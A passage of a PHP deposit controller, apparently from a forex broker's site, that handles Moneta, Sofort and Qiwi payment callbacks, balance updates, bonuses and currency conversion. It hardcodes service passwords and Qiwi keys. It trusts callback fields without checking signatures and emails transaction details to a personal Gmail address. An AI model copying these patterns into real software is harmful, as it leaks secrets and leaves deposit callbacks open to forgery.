            $bonuses = FXPP::getAccountBonusByType($accData->account_number);
            $moneta_amount = $_REQUEST['MNT_CUSTOM2'];
            $RequestLogintype = $this->account_model->getAccountLoginType($user_id);
            if ($RequestLogintype['login_type'] != 1) {
                if ($moneta_amount > 0 and $bonuses[2] > 0) {
                    FXPP::BonusProfitCancellation($user_id, $accData->account_number, $moneta_amount, $_REQUEST['MNT_TRANSACTION_ID']);
                }
            }

            // Bonus Profit Logs**/
            $ndbProfitLogs = [
                'Account_number' => $accData->account_number,
                'DepAmount' => $moneta_amount,
                'UserId' => $user_id,
                'TransactionId' => $_REQUEST['MNT_TRANSACTION_ID'],
                'ndbbonus' => $bonuses[2],
            ];
            $encodeNdbProfitLogs = json_encode($ndbProfitLogs);
            $insertProfitLogs = [
                'logs' => $encodeNdbProfitLogs,
                'User_Id' => $user_id,
            ];

            $this->deposit_model->insertNdbCancellationLogs($insertProfitLogs);

            // moneta fee setup
            unset($Depodata['amount']);
            unset($Depodata['conv_amount']);
            $Depodata['amount'] = $feeConAmount;
            $Depodata['conv_amount'] = $feeConAmountUSD;
            $mtFeeComments = $this->getMonetaPymentTypeFees($_REQUEST['paymentSystem_unitId'], $_REQUEST['MNT_TRANSACTION_ID']);

            if ($result_of_deposit) {
                $this->updateLiveBlanceMoneta($Depodata, $accData->account_number, $feeConAmount, $mtFeeComments, $bonusArray);
                $amountOFreport = floatval($depositConvertAmountUSD) + floatval($feeConAmountUSD);
                /**  Use original amount to Cent accounts for  auto-reports**/
                $isMicro = $this->account_model->isMicro($user_id);
                if ($isMicro) {
                    $amountOFreport /= 100;
                }
                /** End **/

                /** Send successful email deposit to auto-reports **/
                $commentOFreport = $mtComments;
                $this->sendEmailAfterSuccessDeposit('MONETA', $amountOFreport, $accData->account_number, $user_id, $commentOFreport);
                /* End **/
            }
        }
    }

    public function updateLiveBlanceMoneta($data, $account_number, $mtAmount, $mtComments, $bonusArray = [])
    {
        $insertDepositFailed = [
            'transaction_id	' => $data['transaction_id'],
            'status	' => 0,
            'amount	' => $data['amount'],
            'currency' => $data['currency'],
            'user_id' => $data['user_id'],
            'payment_date' => date('Y-m-d H:i:s', strtotime(FXPP::getCurrentDateTime())),
            'transaction_type' => 'MONETA',
            'payment_status' => $data['payment_status'],
            'currency_status' => $data['currency_status'],
            'fee' => ($bonusArray['bonusType'] == '') ? 0 : $mtAmount,
            'isFailed' => 0,
            'type' => 'deposit-'.$bonusArray['bonusType'],
        ];

        $config = [
            'server' => 'live_new',
        ];
//        $WebService = new WebService($config);

//        $account_number = $account_number;

//        if (IPLoc::APIUpgradeDevIP()) {
            $WebServiceNew = FXPP::DepositRealFund($account_number, $mtAmount, $mtComments);
            $requestResult = $WebServiceNew['requestResult'];
            $ticket = $WebServiceNew['ticket'];
//        } else {
//            $WebService->update_live_deposit_balance($account_number, $mtAmount, $mtComments);
//            $requestResult = $WebService->request_status;
//            $ticket = $WebService->get_result('Ticket');
//        }

        $resultdone = false;
        if ($requestResult === 'RET_OK') {
            $data['mt_ticket'] = $ticket;

            // Back Agent of Client
           // FXPP::BackAgentOfAccount($account_number);

            $WebService2 = new WebService($config);
            $WebService2->request_live_account_balance($account_number);
            if ($WebService2->request_status === 'RET_OK') {
                $balance = $WebService2->get_result('Balance');
                $this->account_model->updateAccountBalance($account_number, $balance);
            ////FXPP::extraCommission($account_number,$amount, $data['transaction_id']);  // Exatra commission update
            } else {
                $insertDepositFailed['comment'] = $WebService2->request_status;
                $this->general_model->insert('no_status_transaction', $insertDepositFailed);
            }

            $this->SetAccountAgentPotentialFund($account_number);
            $last_deposit_id = $this->deposit_model->insertPayment($data);

            $resultdone = true;
        } else {
            $insertDepositFailed['comment'] = $requestResult;
            $this->general_model->insert('no_status_transaction', $insertDepositFailed);
        }
//          FXPP::updateAccountTradingStatus($bonusArray['account_number'],$bonusArray['user_id']); // for pro accounts

        if (IPLoc::APIUpgradeDevIP()) {
            FXPP::updateAccountTradingStatusV2($bonusArray['account_number'], $bonusArray['user_id']); // for pro accounts
        } else {
            FXPP::updateAccountTradingStatus($bonusArray['account_number'], $bonusArray['user_id']); // for pro accounts
        }

        if (!empty($bonusArray)) {
//            if ($bonusArray['bonusType'] == 'rhpb') {
//                FXPP::DepositRegular100PercentBonus($bonusArray['user_id'], $bonusArray['account_number'], $bonusArray['amount'], $bonusArray['note'], 'rhpb', $data['transaction_id'], $maxNumofDeposit = 2);
//            } elseif ($bonusArray['bonusType'] == 'hpb') {
//                FXPP::Deposit100PercentBonus($bonusArray['user_id'], $bonusArray['account_number'], $bonusArray['amount'], $bonusArray['note'], 'hplb', $data['transaction_id']);
//            } else {
//                FXPP::DepositBonus($bonusArray['user_id'], $bonusArray['account_number'], $bonusArray['amount'], $bonusArray['note'], $bonusArray['bonusType'], $data['transaction_id']);
//            }
            self::applyDepositBonus(
                $bonusArray['user_id'],
                $bonusArray['account_number'],
                $bonusArray['amount'],
                $bonusArray['note'],
                $bonusArray['bonusType'],
                $data['transaction_id'],
                false
            );
        }

        return $resultdone;
    }

    private function buildMonetaResponse($datax)
    {
        try {
            $performedDatetime = $this->formatDate(new DateTime());
            $sig = $datax['MNT_SIGNATURE']; //md5('74293318'.$datax.'132.25RUB0QWERTY');
            $response = '<?xml version="1.0" encoding="UTF-8"?><MNT_RESPONSE><MNT_ID>'.$datax['MNT_ID'].'</MNT_ID><MNT_TRANSACTION_ID>'.$datax['MNT_TRANSACTION_ID'].'</MNT_TRANSACTION_ID><MNT_RESULT_CODE>'.$datax['MNT_AMOUNT'].'</MNT_RESULT_CODE><MNT_SIGNATURE>'.$datax['MNT_SIGNATURE'].'</MNT_SIGNATURE></MNT_RESPONSE>';

            return $response;
        } catch (\Exception $e) {
            //  $this->log($e);
        }

        return null;
    }

    public function sofort($result = null)
    {
        redirect('');
        if (!FXPP::isAccountFromEUCountry()) {
            show_404('accessing');
        }

        if (!$this->session->userdata('logged')) {
            redirect('deposit');
        }

        $currentUser = $this->session->userdata('user_id');
        $accData = FXPP::getAllACcount($currentUser);
        $data['client_currency'] = $accData->currency;
        if ($data['client_currency'] == 'RUB') {
            $data['client_currency'] = 'RUR';
        }
        //Validation for NDB accounts with Bonus Profit
//        $ndb_status = $this->withdraw_model->hasCancelledNDBbonus($currentUser);
//        $hasInNdbBonus = $this->NodepositBonusValidation($currentUser);
//        if ($hasInNdbBonus == 2) { //has Ndb Bonus
//            $data['CurPendValidation'] = $this->CurrentAndPendingTradesValidation();//returns false if no open trades
//        }

        // Validation[ Valid account, complete employment details, is supporters accounts] return false or error message
        $data['error_msg'] = $this->updated_deposit_validation($currentUser);

        $currenccySet = $accData->currency;
        if (IPLoc::Office()) {
            $accountType = FXPP::fmGroupType($accData->account_number);
            switch ($accountType) {
                case 'ForexMart Classic':
                case 'ForexMart Cents':
                    $minAmount = 15; //usd
                    $fixAmountEur = $this->get_convert_amount('USD', $minAmount, 'EUR');
                    break;
                case 'ForexMart Pro':
                    $minAmount = 200; //usd
                    $fixAmountEur = $this->get_convert_amount('USD', $minAmount, 'EUR');
                    break;
                default:
                    $fixAmountEur = 0.90; //EUR
                    break;
            }
        } else {
            $fixAmountEur = 0.90; //EUR
        }

        $stadartUSDAmount = $this->get_convert_amount('EUR', $fixAmountEur, $currenccySet);

        $ammount = $this->input->post_get('amount1', true);

        if ($ammount == null) {
            $this->form_validation->set_rules('sum', ' Deposit Amount', 'trim|required|xss_clean');

            $ammount = $this->input->post('sum', true);
            $USDamount = $this->get_convert_amount($currenccySet, $ammount, 'USD');

            $eurAmount = $this->get_convert_amount($currenccySet, $ammount, 'EUR');
            $eurAmount = str_replace(',', '', $eurAmount);
            $eurAmount = (float) $eurAmount;
            $cheCkAmount = floor($eurAmount * 100) / 100;

            if ($cheCkAmount >= $fixAmountEur) {
                $data = [
                    'reason_1' => uniqid('FM-'.$currentUser),
                    'reason_2' => '',
                    'amount' => $eurAmount,
                    'account_number' => '123144', //'123144',
                    'project_id' => '288357', //'288357',
                    'user_variable_0' => $currentUser.'_'.$this->input->post('bounusfiled', true).'_'.$_GET['bonus'],
                    'user_variable_1' => $ammount,
                ];

                FXPP::isEUPayment('deposit/sofort');

                FXPP::failedPaymentNotify('sofort'); //FXPP-9628

                $this->load->view('deposits/sofort_payment', $data);
            } else {
                $minAmount = ceil($stadartUSDAmount * 100) / 100;

                $data['amountmgs'] = 'Minimum deposit is at least '.$minAmount.' '.$currenccySet;

                if ($this->session->userdata('login_type') == 1) {
                    $user_status = $this->partners_model->getAccountStatus($currentUser);
                } else {
                    $user_status = $this->account_model->getAccountStatus($currentUser);
                }
                $data['incomplete'] = $this->account_model->incompleteRegistration($currentUser);

                // $data['user_status'] = $user_status;
                $data['non_verified_notice'] = (!$user_status) ? $this->non_verified_notice() : false;
                $data['disabled'] = !$data['error_msg'] ? '' : 'disabled';

                $eu_payment_result = $this->euPaymentStatus($currentUser, 'sofort'); //FXPP-9628
                $data['eu_payment_status'] = $eu_payment_result['error'];
                $data['eu_error_message'] = $eu_payment_result['error_msg'];

                $data['metadata_description'] = 'Provide the necessary information to deposit via Sofort. Request is processed within 24 hours.';

                if ($this->session->userdata('login_type') == 1) {
                    $account = $this->partners_model->getAccountByUserId($currentUser);
                } else {
                    $account = $this->account_model->getAccountByUserId($currentUser);
                }

                $data['account'] = $account;
                if ($this->session->userdata('login_type') == 1) {
                    $account['mt_currency_base'] = $account['currency'];
                    $data['account']['mt_currency_base'] = $account['currency'];
                    $data['account']['account_number'] = $account['reference_num'];
                }
                $data['account']['currency'] = $this->general_model->getAccountCurrencyBase($account['mt_currency_base']);
                $data['account']['currency_new'] = $data['account']['currency'];
                if ($data['account']['currency_new'] == 'RUB') {
                    $data['account']['currency_new'] = 'RUR';
                }
                $js = $this->template->Js();
                $this->template->title('ForexMart | Deposit - Sofort')
                    ->set_layout('internal/main')
                    ->build('deposits/sofort', $data);
            }
        } else {
            $is_disable = !$data['error_msg'] ? '' : 'disabled';
            if ($is_disable) {
                $ptype = 'sft';
                redirect(base_url("deposit?method=$ptype&minimum=0"));
            }

            $USDamount = $this->get_convert_amount($currenccySet, $ammount, 'USD');
            $eurAmount = $this->get_convert_amount($currenccySet, $ammount, 'EUR');
            $eurAmount = str_replace(',', '', $eurAmount);
            $eurAmount = (float) $eurAmount;
            $cheCkAmount = floor($eurAmount * 100) / 100;
            if ($cheCkAmount >= $fixAmountEur) {
                $data = [
                    'reason_1' => uniqid('FM-'.$currentUser),
                    'reason_2' => '',
                    'amount' => $eurAmount,
                    'account_number' => '123144', //'123144',
                    'project_id' => '288357', //'288357',
                    'user_variable_0' => $currentUser.'_'.$this->input->post('bounusfiled', true).'_'.$_GET['bonus'],
                    'user_variable_1' => $ammount,
                ];

                FXPP::isEUPayment('deposit/sofort');
                $this->load->view('deposits/sofort_payment', $data);
            } else {
                $minAmount = ceil($stadartUSDAmount * 100) / 100;
                $amountmgs = 'Minimum deposit is at least '.$minAmount.' '.$currenccySet;
                $minimumamount = $minAmount.'__'.$currenccySet;
                $ptype = 'sft';
                redirect(base_url("deposit?method=$ptype&minimum=$minimumamount"));
            }
        }

        // please do not delete below comments code [firozur]
        /*



      //  if(!IPLoc::IPCrpAccVerify()){ redirect("deposit");}

        if ($this->session->userdata('logged')) {
//            No need yser type verified it's allow client and partner
//            FXPP::LoginTypeRestriction();
//            $userAccountCurrencyBase = FXPP::getCustomUserAccountCurrencyBase();


            $data['amount'] = $this->input->post('amount1', true);
            $data['bounusfiled'] = $this->input->post('bounusfiled', true);
            if ($data['amount'] == NULL) {
                $this->form_validation->set_rules('sum', ' Deposit Amount', 'trim|required|xss_clean');
            }


            $error = '';
            $message = '';
            $field = '';
            $showModalOnLoad = false;
            $details = '';
            $showForm = 'nt-tab1';
            $data['amountmgs'] = "";

            $currentUser = $this->session->userdata('user_id');
            $accData = FXPP::getAllACcount($currentUser);
            $data['client_currency'] = $accData->currency;
            if ($data['client_currency'] == 'RUB') {
                $data['client_currency'] = 'RUR';
            }
            //Validation for NDB accounts with Bonus Profit
            $ndb_status = $this->withdraw_model->hasCancelledNDBbonus($this->session->userdata('user_id'));
            $hasInNdbBonus = $this->NodepositBonusValidation($this->session->userdata('user_id'));
            if ($hasInNdbBonus == 2) { //has Ndb Bonus
                $data['CurPendValidation'] = $this->CurrentAndPendingTradesValidation();//returns false if no open trades
            }

            // Validation[ Valid account, complete employment details, is supporters accounts] return false or error message
            $data['error_msg'] = $this->deposit_validation($this->session->userdata('user_id'));
            if ($this->form_validation->run() && !$data['error_msg']) {
                if (!$data['CurPendValidation']['TradeError'] || $ndb_status) { //FXPP-5960

                    FXPP::curLan('deposit/sofort');
                    $currenccySet = $accData->currency;
                    $fixAmountEur = 0.90;
                    $stadartUSDAmount = $this->get_convert_amount('EUR', $fixAmountEur, $currenccySet);

                    $ammount = $this->input->post('sum', true);

                  //   FXPP-6333
             //   $isMicro = $this->account_model->isMicro($currentUser);
            //    if ($isMicro) {
              //      $ammount /= 100;
             //   }
            //     FXPP-6333
                    $USDamount = $this->get_convert_amount($currenccySet, $ammount, 'USD');

                    $eurAmount = $this->get_convert_amount($currenccySet, $ammount, 'EUR');
                    $eurAmount = str_replace(",", "", $eurAmount);
                    $eurAmount = (float) $eurAmount;
                    $cheCkAmount = floor($eurAmount * 100) / 100;


                    if ($cheCkAmount >= $fixAmountEur) {
                        $data = array(
                            'reason_1' => uniqid('FM-' . $currentUser),
                            'reason_2' => '',
                            'amount' => $eurAmount,
                            'account_number' => '123144',//'123144',
                            'project_id' => '288357',//'288357',
                            'user_variable_0' => $currentUser . "_" . $this->input->post('bounusfiled', true) . "_" . $_GET['bonus'],
                            'user_variable_1' => $ammount
                        );


                        $this->load->view('deposits/sofort_payment', $data);

                    } else {
                        $minAmount = ceil($stadartUSDAmount * 100) / 100;

                        $data['amountmgs'] = 'Minimum deposit is at least ' . $minAmount . " " . $currenccySet;


                        $js = $this->template->Js();

                        $this->template->title("ForexMart | Deposit - Sofort")
                            ->set_layout('internal/main')
                            ->build('deposits/sofort', $data);

                    }


                }
            } else {


                $data['success'] = $result;
                $display = $this->session->flashdata('d_mnt_status');
                if (isset($display)) {
                    $accData = FXPP::getAllACcount($this->session->userdata('user_id'));
                    $stat_msg = array(
                        0 => 'FAILED',
                        1 => 'CANCELLED',
                    );
                    $email_details = array(
                        'account_number' => $accData->account_number,
                        'type' => 'Sofort',
                        'reason' => $stat_msg[$display],
                    );
                    $this->sendEmailFailedDeposit($email_details);
                }
                $data['count_status'] = $this->general_model->getCountVerifyStatus($this->session->userdata('user_id'));//joy deposit FXPP-6768
                //$data['$bonusAmount'] = $bonusAmount;
                $js = $this->template->Js();
                $this->template->title("ForexMart | Deposit - Sofort")
                    ->set_layout('internal/main')
                    ->build('deposits/sofort', $data);
            }
        } else {
            redirect('signout');
        }

*/
    }

    public function sofortAbort()
    {
        $this->session->set_flashdata('d_sf_status', 'CANCELLED');
        //redirect(FXPP::loc_url('deposit/sofort'));
        $this->euRedirect();
        redirect(FXPP::curLan());
    }

//    public function sofortSuccess()
//    {
//
//
//        $this->session->set_flashdata('msg_transaction','Please be informed that upon successful deposit, NDB will be automatically cancelled.');
//        // redirect(FXPP::loc_url('deposit/sofort'));
//        redirect(FXPP::curLan());
//    }
    public function sofortSuccess()
    {
        // transection compleate then set mgs
        $userPercent = explode('_', $_REQUEST['user_variable_0']);
        $mgsData = [
            'user_id' => $userPercent[0],
            'raw_amount' => $_REQUEST['user_variable_1'],
            'transaction_id' => $_REQUEST['transaction'],
        ];
        $this->transactionMessage($mgsData);
        $this->euRedirect();
        redirect('deposit/sofort');
    }

    public function sofortNotification()
    {
        $userPercent = explode('_', $_REQUEST['user_variable_0']);
        $user_id = $userPercent[0];
        $bonusCheck = $userPercent[1];
        $bonusType = $userPercent[2];

        /* FXPP-6333 */
        $isMicro = $this->account_model->isMicro($user_id);
        if ($isMicro) {
            $_REQUEST['amount'] *= 100;
            $_REQUEST['user_variable_1'] *= 100;
        }
        /* FXPP-6333 */

        $USDAmount = $this->get_convert_amount($_REQUEST['currency_id'], $_REQUEST['amount'], 'USD');
        $data = [
            'transaction_no' => $_REQUEST['transaction'],
            'account_number' => $_REQUEST['user_id'],
            'project_id' => $_REQUEST['project_id'],
            'sender_holder' => $_REQUEST['sender_holder'],
            'sender_account_number' => $_REQUEST['sender_account_number'],
            'sender_bank_code' => $_REQUEST['sender_bank_code'],
            'sender_bank_name' => $_REQUEST['sender_bank_name'],
            'sender_bank_bic' => $_REQUEST['sender_bank_bic'],
            'sender_iban' => $_REQUEST['sender_iban'],
            'sender_country_id' => $_REQUEST['sender_country_id'],
            'recipient_holder' => $_REQUEST['recipient_holder'],
            'recipient_account_number' => $_REQUEST['recipient_account_number'],
            'recipient_bank_code' => $_REQUEST['recipient_bank_code'],
            'recipient_bank_name' => $_REQUEST['recipient_bank_name'],
            'email_recipient' => $_REQUEST['email_recipient'],
            'recipient_bank_bic' => $_REQUEST['recipient_bank_bic'],
            'recipient_iban' => $_REQUEST['recipient_iban'],
            'recipient_country_id' => $_REQUEST['recipient_country_id'],
            'international_transaction' => $_REQUEST['international_transaction'],
            'amount' => $_REQUEST['amount'],
            'currency_id' => $_REQUEST['currency_id'],
            'reference_reason_1' => $_REQUEST['reason_1'],
            'reference_reason_2' => $_REQUEST['reason_2'],
            'user_id' => $user_id,
            'raw_amount' => $_REQUEST['user_variable_1'],
            'security_criteria' => $_REQUEST['security_criteria'],
            'user_variable_0' => $user_id,
            'user_variable_1' => $_REQUEST['user_variable_1'],
            'user_variable_2' => $_REQUEST['user_variable_2'],
            'user_variable_3' => $_REQUEST['user_variable_3'],
            'user_variable_4' => $_REQUEST['user_variable_4'],
            'user_variable_5' => $_REQUEST['user_variable_5'],
            'created_date' => $_REQUEST['created'],
            'hashkey' => $_REQUEST['hash'],
            'deposit_usd_amount' => $USDAmount,
            'bonusType' => ($bonusCheck == 1) ? $bonusType : 0,
        ];

        $alreadyInCheck = $this->general_model->getQueryStirngRow('sofort', '*', ['transaction_no' => $_REQUEST['transaction']]);
        if (!$alreadyInCheck) {
            $this->general_model->insert('sofort', $data);
        }

        $currentUser = $user_id;
        $accData = FXPP::getAllACcount($currentUser);
        $currenccySet = $accData->currency;

        $currencyStatus = $this->currency_status[$currenccySet];
        $isMicro = $this->account_model->isMicro($user_id);
        if ($isMicro) {
            $currencyStatus = $this->currency_status['Cents'];
        }

        $convertAmount = $this->get_convert_amount($_REQUEST['currency_id'], $_REQUEST['amount'], $currenccySet);
        $convertAmountUSD = $this->get_convert_amount($_REQUEST['currency_id'], $_REQUEST['amount'], 'USD');

        // default fee in sofort 0.25 user currencty wise
        $firxedAmountfee = $this->get_convert_amount($_REQUEST['currency_id'], 0.25, $currenccySet);
        $firxedAmountfeeUSD = $this->get_convert_amount($_REQUEST['currency_id'], 0.25, 'USD');

        /* free and amount get */
        $feeConvertAmount = (($convertAmount * 2) / 100) + $firxedAmountfee;
        $depositConvertAmount = $convertAmount - $feeConvertAmount;

        $feeconvertAmountUSD = (($convertAmountUSD * 2) / 100) + $firxedAmountfeeUSD;
        $depositConvertAmountUSD = $convertAmountUSD - $feeconvertAmountUSD;

        /* free and amount get  close*/

        $Depodata = [
            'transaction_id' => $_REQUEST['transaction'],
            'reference_id' => 0,
            'status' => 2, // 1= demo 2= real
            'currency' => $currenccySet,
            'amount' => $depositConvertAmount, // user currency base deposit total amount
            'conv_amount' => $depositConvertAmountUSD,  // Default amount USD
            'user_id' => $user_id,
            'payment_date' => date('Y-m-d H:i:s', strtotime(FXPP::getCurrentDateTime())),
            'note' => 'SOFORT DEPOSIT',
            'transaction_type' => 'SOFORT',
            'payment_status' => $this->paymentType_status['Deposit via Sofort'], //FXPP-7618
            'currency_status' => $currencyStatus, //FXPP-7618
        ];

        $bonusArray = [];
        if ($bonusCheck == 1) {
            $bonusArray = [
                'user_id' => $user_id,
                'account_number' => $accData->account_number,
                'amount' => $_REQUEST['user_variable_1'],
                'note' => 'SOFORT',
                'bonusType' => $bonusType,
            ];
        }

        $logData = ['table' => 'sofort', 'transection_id_column_name' => 'transaction_no'];
        $abcCheck = $this->checkPaymentHistory('SOFORT', $_REQUEST['transaction'], $user_id, $logData);

        //  if($this->deposit_model->isExistTransaction(trim($_REQUEST['transaction']), 'SOFORT') == 0 )
        if ($abcCheck == 'empty') {
            $this->general_model->update('sofort', 'transaction_no', $_REQUEST['transaction'], ['status' => 1]);

            $mtComments = str_replace('-', '', $_REQUEST['transaction']);
            $result_of_deposit = $this->updateLiveBlanceSofort($Depodata, $accData->account_number, $depositConvertAmount, 'DPST_SF_'.$mtComments);

            // Bonus Profit Cancellation**/
            $bonuses = FXPP::getAccountBonusByType($accData->account_number);
            $sofort_amount = $_REQUEST['user_variable_1'];
            $RequestLogintype = $this->account_model->getAccountLoginType($user_id);
            if ($RequestLogintype['login_type'] != 1) {
                if ($sofort_amount > 0 and $bonuses[2] > 0) {
                    FXPP::BonusProfitCancellation($user_id, $accData->account_number, $sofort_amount, $_REQUEST['transaction']);
                }
            }

            // Bonus Profit Logs**/
            $ndbProfitLogs = [
                'Account_number' => $accData->account_number,
                'DepAmount' => $sofort_amount,
                'UserId' => $user_id,
                'TransactionId' => $_REQUEST['transaction'],
                'ndbbonus' => $bonuses[2],
            ];
            $encodeNdbProfitLogs = json_encode($ndbProfitLogs);
            $insertProfitLogs = [
                'logs' => $encodeNdbProfitLogs,
                'User_Id' => $user_id,
            ];

            $this->deposit_model->insertNdbCancellationLogs($insertProfitLogs);

            // sofort fee setup
            unset($Depodata['amount']);
            unset($Depodata['conv_amount']);
            $Depodata['amount'] = $feeConvertAmount;
            $Depodata['conv_amount'] = $feeconvertAmountUSD;

            if ($result_of_deposit) {
                $this->updateLiveBlanceSofort($Depodata, $accData->account_number, $feeConvertAmount, 'FEES_SF_'.$mtComments, $bonusArray); //"FEES_SF_".$_REQUEST['transaction']);

                $amountOFreport = floatval($depositConvertAmountUSD) + floatval($feeconvertAmountUSD);
                /**  Use original amount to Cent accounts for  auto-reports**/
                $isMicro = $this->account_model->isMicro($user_id);
                if ($isMicro) {
                    $amountOFreport /= 100;
                }
                /** End **/

                /** Send successful email deposit to auto-reports **/
                $commentOFreport = 'DPST_SF_'.$mtComments;
                $this->sendEmailAfterSuccessDeposit('SOFORT', $amountOFreport, $accData->account_number, $user_id, $commentOFreport);
                /** End **/
                // transection compleate then set mgs
                $mgsData = [
                    'user_id' => $user_id,
                    'raw_amount' => $_REQUEST['user_variable_1'],
                    'transaction_id' => $_REQUEST['transaction'],
                ];
                $this->transactionMessage($mgsData);
            }
        }

        if ($_REQUEST['STATUS'] !== 200) {
            if (array_key_exists('status_reason', $_REQUEST) && !empty($_REQUEST['status_reason'])) {
                $statusReason = $_REQUEST['status_reason'];
                FXPP::failedPaymentNotify('sofort', 1, $user_id, $statusReason); //FXPP-9628
            } else {
                $status_msg = [
                    '201' => 'Created',
                    '204' => 'No Content',
                    '400' => 'Bad Request',
                    '401' => 'Unauthorized',
                    '402' => 'Request Failed',
                    '404' => 'Not Found',
                    '500' => 'Server errors',
                    '502' => 'Server errors',
                    '503' => 'Server errors',
                    '504' => 'Server errors',
                ];
//                    $statusReason = $status_msg[$_REQUEST['STATUS']];
                $statusReason = $_REQUEST['STATUS'];
            }
            $account_detail = $this->account_model->getAccountByUserId($user_id);
            $email_details = [
                'account_number' => $account_detail['account_number'],
                'type' => 'Sofort',
                'reason' => $statusReason,
            ];
            $this->sendEmailFailedDeposit($email_details);
        }
    }

    public function updateLiveBlanceSofort($data, $account_number, $mtAmount, $mtComments, $bonusArray = [])
    {
        $insertDepositFailed = [
            'transaction_id	' => $data['transaction_id'],
            'status	' => 0,
            'amount	' => $data['amount'],
            'currency' => $data['currency'],
            'user_id' => $data['user_id'],
            'payment_date' => date('Y-m-d H:i:s', strtotime(FXPP::getCurrentDateTime())),
            'transaction_type' => 'SOFORT',
            'payment_status' => $data['payment_status'],
            'currency_status' => $data['currency_status'],
            'fee' => ($bonusArray['bonusType'] == '') ? 0 : $mtAmount,
            'isFailed' => 0,
            'type' => 'deposit-'.$bonusArray['bonusType'],
        ];

        $config = [
            'server' => 'live_new',
        ];
        $resultdone = false;

//        $WebService = new WebService($config);
//        $account_number = $account_number;

//        if (IPLoc::APIUpgradeDevIP()) {
            $WebServiceNew = FXPP::DepositRealFund($account_number, $mtAmount, $mtComments);
            $requestResult = $WebServiceNew['requestResult'];
            $ticket = $WebServiceNew['ticket'];
//        } else {
//            $WebService->update_live_deposit_balance($account_number, $mtAmount, $mtComments);
//            $requestResult = $WebService->request_status;
//            $ticket = $WebService->get_result('Ticket');
//        }

        if ($requestResult === 'RET_OK') {
            $data['mt_ticket'] = $ticket;

            // Back Agent of Client
           // FXPP::BackAgentOfAccount($account_number);

            $WebService2 = new WebService($config);
            $WebService2->request_live_account_balance($account_number);
            if ($WebService2->request_status === 'RET_OK') {
                $balance = $WebService2->get_result('Balance');
                $this->account_model->updateAccountBalance($account_number, $balance);
            ////FXPP::extraCommission($account_number,$amount, $data['transaction_id']);  // Exatra commission update
            } else {
                $insertDepositFailed['comment'] = $WebService2->request_status;
                $this->general_model->insert('no_status_transaction', $insertDepositFailed);
            }

            $this->SetAccountAgentPotentialFund($account_number);
            $last_deposit_id = $this->deposit_model->insertPayment($data);

            $resultdone = true;
        } else {
            $insertDepositFailed['comment'] = $requestResult;
            $this->general_model->insert('no_status_transaction', $insertDepositFailed);
        }

        if (!empty($bonusArray)) {
//            if ($bonusArray['bonusType'] == 'rhpb') {
//                FXPP::DepositRegular100PercentBonus($bonusArray['user_id'], $bonusArray['account_number'], $bonusArray['amount'], $bonusArray['note'], 'rhpb', $data['transaction_id'], $maxNumofDeposit = 2);
//            } elseif ($bonusArray['bonusType'] == 'hpb') {
//                FXPP::Deposit100PercentBonus($bonusArray['user_id'], $bonusArray['account_number'], $bonusArray['amount'], $bonusArray['note'], 'hplb', $data['transaction_id']);
//            } else {
//                FXPP::DepositBonus($bonusArray['user_id'], $bonusArray['account_number'], $bonusArray['amount'], $bonusArray['note'], $bonusArray['bonusType'], $data['transaction_id']);
//            }
            self::applyDepositBonus(
                $bonusArray['user_id'],
                $bonusArray['account_number'],
                $bonusArray['amount'],
                $bonusArray['note'],
                $bonusArray['bonusType'],
                $data['transaction_id'],
                false
            );
        }

        return $resultdone;
    }

    private function get_convert_amount($currency, $amount, $to_currency = 'USD')
    {
        if ($amount > 0) {
            if ($currency == $to_currency) {
                $conv_amount = $amount;
            } else {
                $converter_config = [
                'server' => 'converter',
            ];

                $WebService = new WebService($converter_config);
                $data = [
                'Amount' => $amount,
                'FromCurrency' => $currency,
                'ToCurrency' => $to_currency,
                'ServiceLogin' => '505641',
                'ServicePassword' => '5fX#p8D^c89bQ',
            ];

                $ConvertCurrency = $WebService->ConvertCurrency($data);
                $resultConvertCurrency = $ConvertCurrency['ConvertCurrencyResult'];
                if ($resultConvertCurrency['Status'] === 'RET_OK' || $resultConvertCurrency['Status'] === 'RET_GAP') {
                    $converted_amount = $resultConvertCurrency['ToAmount'];
                    $conv_amount = $converted_amount;
                } else {
                    $conv_amount = $amount;

                    $log_data = [
                    'log' => $resultConvertCurrency['Status'].'>>from '.$currency.'>>'.$amount.'>>to '.$to_currency,
                    'amount' => $amount,
                    'currency' => $currency,
                    'user_id' => $this->session->userdata('user_id'), ];

                    $this->general_model->insertmy('convert_amount_log', $log_data);
                }
            }

            return $conv_amount;
        }

        return $amount;
    }

    private function get_convert_amount2($currency, $amount, $to_currency = 'USD')
    {
        if ($currency == $to_currency) {
            echo 'is equal';
            $conv_amount = $amount;
        } else {
            echo 'is not equal';
            $converter_config = [
                'server' => 'converter',
            ];

            $WebService = new WebService($converter_config);
            $data = [
                'Amount' => $amount,
                'FromCurrency' => $currency,
                'ToCurrency' => $to_currency,
                'ServiceLogin' => '505641',
                'ServicePassword' => '5fX#p8D^c89bQ',
            ];

            $ConvertCurrency = $WebService->ConvertCurrency($data);
            $resultConvertCurrency = $ConvertCurrency['ConvertCurrencyResult'];
            if ($resultConvertCurrency['Status'] === 'RET_OK' || $resultConvertCurrency['Status'] === 'RET_GAP') {
                $converted_amount = $resultConvertCurrency['ToAmount'];
                $conv_amount = $converted_amount;
            } else {
                $conv_amount = $amount;
            }
        }

        return $conv_amount;
    }

    private function clean($string)
    {
        $string = str_replace(' ', '-', $string); // Replaces all spaces with hyphens.

        return preg_replace('/[^A-Za-z0-9\-]/', '', $string); // Removes special chars.
    }

    public function qiwiSuccess()
    {
        $this->euRedirect(); // only for eu domain
        redirect(FXPP::loc_url('my-account'));
    }

    public function qiwiNotifications()
    {
        $test = ['data' => serialize($_POST), 'ip' => $this->input->ip_address()];
        $this->general_model->insertmy('qiwi_test', $test);

        $inv = $this->input->post('bill_id', true);
        $this->load->library('Qiwi');
        $shop = new QIWI('399501', '40572686', 'wSvuICfXoCfZcq8Qr529');
        //$shop -> getInvoice( '154741251415214' );

        $shop->getInvoice($inv);

        $email_data = [
            'full_name' => 'vela',
            'email' => 'vela.nightclad@gmail.com',
            'password' => '14563333',
            'account_number' => '',
        ];
        $subject = 'Qiwi details';

        $this->load->library('email');
        $response = 'transaction_id => '.$shop->getInvoiceID().'<br/>';
        if ($shop->getResult() == QCONST::SUCCESS) {
            $response .= 'status => 2';
        } else {
            $response .= 'status => 0';
        }
        $response .= 'amount => '.$shop->getAmount();
        $response .= 'currency => '.$shop->getCurrency();
        $response .= 'note => '.$shop->getComment();

        $this->email->from('noreply@mail.forexmart.com', 'ForexMart');
        $this->email->reply_to('noreply@mail.forexmart.com', 'ForexMart');
        $this->email->to($email_data['email']);
        $this->email->subject($subject);
        $this->email->message($response);
        $this->email->send();

